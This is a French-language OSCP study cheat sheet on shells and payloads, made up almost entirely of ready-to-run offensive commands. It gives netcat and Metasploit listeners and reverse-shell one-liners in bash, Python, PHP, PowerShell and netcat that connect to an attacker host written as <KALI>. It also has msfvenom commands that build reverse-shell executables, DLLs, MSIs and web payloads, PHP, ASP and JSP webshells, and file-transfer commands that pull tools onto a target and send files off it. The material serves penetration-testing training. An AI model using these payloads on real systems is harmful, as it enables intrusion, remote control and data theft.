# 06 — Shells & Payloads

## 1. Listeners

```bash
# Netcat
nc -lvnp 4444

# Rlwrap (pour avoir les flèches dans le shell)
rlwrap nc -lvnp 4444

# Metasploit (1 seul usage exam)
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <KALI>
set LPORT 4444
run
```

---

## 2. Reverse shells one-liners

### Bash
```bash
bash -i >& /dev/tcp/<KALI>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'
0<&196;exec 196<>/dev/tcp/<KALI>/4444; sh <&196 >&196 2>&196
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```bash
php -r '$sock=fsockopen("<KALI>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'"); ?>
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<KALI>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Netcat
```bash
nc -e /bin/bash <KALI> 4444
nc -e cmd.exe <KALI> 4444          # Windows
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI> 4444 >/tmp/f
```

---

## 3. Stabilisation du shell Linux

```bash
# Méthode 1 — Python PTY (la plus rapide)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Puis : Ctrl+Z
stty raw -echo; fg
# Puis : Enter
export TERM=xterm

# Méthode 2 — Script
script /dev/null -c bash
# Puis : Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Taille du terminal (évite les problèmes d'affichage)
stty size                          # sur ton terminal local
stty rows <X> cols <Y>             # dans le shell cible
```

---

## 4. msfvenom — Générer des payloads

```bash
# Windows — Reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell32.exe

# Windows — DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o evil.dll

# Windows — MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi

# Windows — PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f ps1 -o shell.ps1

# Linux — ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf

# Web
msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f war -o shell.war
```

---

## 5. Webshells utiles

```php
<!-- PHP basique -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>

<!-- PHP avec upload -->
<?php
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
system($_GET['cmd']);
?>
```

```asp
<!-- ASP -->
<%eval request("cmd")%>
```

```jsp
<!-- JSP -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## 6. Transfert de fichiers

### Depuis Kali vers la cible

```bash
# Linux cible
python3 -m http.server 80
wget http://<KALI>/file
curl -o file http://<KALI>/file

# Windows cible
python3 -m http.server 80
iwr -uri http://<KALI>/file -outfile file
certutil -urlcache -split -f http://<KALI>/file file
bitsadmin /transfer job http://<KALI>/file C:\Windows\Temp\file

# SMB (pas besoin d'ouvrir de port sur la cible)
impacket-smbserver share . -smb2support -username user -password pass
# Sur Windows :
net use \\<KALI>\share /user:user pass
copy \\<KALI>\share\file .
```

### Depuis la cible vers Kali

```bash
# Linux
nc -lvnp 4444 > received_file                    # Kali
nc <KALI> 4444 < /path/to/file                   # Cible

# Windows
# Via SMB
copy file \\<KALI>\share\

# Base64 encode/decode
# Cible Linux :
base64 -w 0 file.bin
# Kali :
echo "<base64>" | base64 -d > file.bin
```

---

## Tags
#oscp #shells #payloads #reverseshell #msfvenom
